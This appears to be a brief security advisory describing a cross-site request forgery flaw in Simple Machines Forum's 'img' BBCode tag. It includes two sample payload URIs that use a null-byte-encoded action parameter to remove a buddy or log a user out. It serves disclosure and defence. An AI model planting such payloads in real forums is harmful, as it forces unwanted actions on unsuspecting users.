Simple Machines Forum 'img' BBCode Tag Cross Site Request Forgery Vulnerability

To exploit this issue, an attacker must entice an unsuspecting victim into following a malicious URI.

The following sample input is available:

imghttp://www.example.com/index.php?sa=editBuddies;remove=102;action%00=profile/img

imghttp://www.example.com/community/index.php?action%00=logout;token/img
